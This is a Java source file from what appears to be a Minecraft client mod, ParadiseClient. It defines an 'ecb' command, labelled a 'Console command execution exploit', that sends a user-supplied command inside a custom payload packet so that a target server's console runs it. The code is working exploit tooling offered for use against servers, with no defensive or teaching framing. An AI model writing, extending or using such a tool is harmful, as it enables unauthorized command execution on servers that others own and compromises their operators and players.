package io.github.spigotrce.paradiseclientfabric.command.impl;

import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import io.github.spigotrce.paradiseclientfabric.Helper;
import io.github.spigotrce.paradiseclientfabric.command.Command;
import io.github.spigotrce.paradiseclientfabric.packet.ECBPayloadPacket;
import net.minecraft.client.MinecraftClient;
import net.minecraft.command.CommandSource;
import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;

public class ECBCommand extends Command {
    public ECBCommand() {
        super("ecb", "Console command execution exploit");
    }

    @Override
    public void build(LiteralArgumentBuilder<CommandSource> root) {
        root.executes(context -> {
                    Helper.printChatMessage("Incomplete command!");
                    return SINGLE_SUCCESS;
                })
                .then(argument("command", StringArgumentType.greedyString())
                        .executes(context -> {
                            Helper.sendPacket(new CustomPayloadC2SPacket(
                                    new ECBPayloadPacket(context.getArgument("command", String.class))));
                            Helper.printChatMessage("Payload sent!");
                            return SINGLE_SUCCESS;
                        })
                );
    }
}
